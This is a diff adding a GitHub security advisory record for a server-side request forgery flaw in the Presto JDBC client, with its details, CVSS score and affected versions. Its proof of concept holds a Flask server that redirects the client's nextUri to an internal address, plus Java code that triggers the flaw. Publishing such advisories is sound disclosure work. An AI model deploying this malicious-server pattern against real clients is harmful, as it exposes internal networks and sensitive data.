@@ -1,0 +1,57 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-86q5-qcjc-7pv4",
+  "modified": "2023-10-03T21:54:06Z",
+  "published": "2023-10-03T21:54:06Z",
+  "aliases": [
+
+  ],
+  "summary": "Presto JDBC Server-Side Request Forgery by nextUri",
+  "details": "### Summary\n\nPresto JDBC is vulnerable to Server-Side Request Forgery (SSRF) when connecting a remote Presto server. An attacker can modify the nextUri parameter to internal server in response content that Presto JDBC client will request next and view sensitive information from highly sensitive internal servers or perform a local port scan. \n\n### Details\n\nThe Presto protocol has a nextUri parameter that specifies which URI the client will request next to obtain more query data. Presto JDBC will directly use the nextUri returned by the remote Presto server as the URL for the next request. So if a malicious server modify the nextUri parameter to the internal server, JDBC will request it and cause SSRF.\n\nFor unexpected responses, JDBC will put the response body into the error. So the response of the internal server will be leaked if the server also returns the error directly to the user.\n\nThe relevant code is in file path `/presto-client/src/main/java/com/facebook/presto/client/StatementClientV1.java` and function `advance` .\n\nThe flowchart is as follows:\n\n<img src=\"https://s2.loli.net/2023/09/18/gvUZ2rT7w3Okbde.png\" alt=\"presto_jdbc_ssrf_2.png\" style=\"zoom:50%;\" />\n\n### PoC\n\nRunning an HTTP service to route POST /v1/statement redirect to the intranet. For example, using these Python code:\n\n```python\nfrom flask import Flask, Response\n\napp = Flask(__name__)\n\n@app.route('/v1/statement', methods=['POST'])\ndef next_uri_to_interal_server():\n    data = '{\"id\":\"test_id\",\"infoUri\":\"whatever\",\"nextUri\":\"http://127.0.0.1:8888\",\"stats\":{\"state\":\"QUEUED\",\"queued\":true,\"scheduled\":false,\"nodes\":0,\"totalSplits\":0,\"queuedSplits\":0,\"runningSplits\":0,\"completedSplits\":0,\"cpuTimeMillis\":0,\"wallTimeMillis\":0,\"queuedTimeMillis\":0,\"elapsedTimeMillis\":0,\"processedRows\":0,\"processedBytes\":0,\"peakMemoryBytes\":0,\"peakTotalMemoryBytes\":0,\"peakTaskTotalMemoryBytes\":0,\"spilledBytes\":0},\"warnings\":[]}'\n    return Response(data, content_type='application/json; charset=utf-8', status=200)\n\nif __name__ == '__main__':\n    app.run(host=\"0.0.0.0\",port=8000)\n```\n\nConnecting to the malicious server using JDBC:\n\n```java\nString url = \"jdbc:presto://<ip>:<port>\";\nProperties properties = new Properties();\nproperties.setProperty(\"user\", \"root\");\ntry {\n    Connection connection = DriverManager.getConnection(url, properties);\n    Statement stmt = connection.createStatement();\n    ResultSet res = stmt.executeQuery(\"show catalogs\");\n    while(res.next()) {\n        System.out.println(res.getString(1));\n    }\n} catch (Exception e) {\n    e.printStackTrace();\n}\n```\n\nPwned!\n\n### Impact\n\nWhen the target remote Presto server to be connected is controllable,  an attacker can view sensitive information from highly sensitive internal servers or perform a local port scan. \n\nVulnerability Discovery Credit: Jianyu Li @ WuHeng Lab of ByteDance",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:L"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Maven",
+        "name": "com.facebook.presto:presto-jdbc"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.283"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/prestodb/presto/security/advisories/GHSA-86q5-qcjc-7pv4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/prestodb/presto"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-918"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-10-03T21:54:06Z",
+    "nvd_published_at": null
+  }
+}
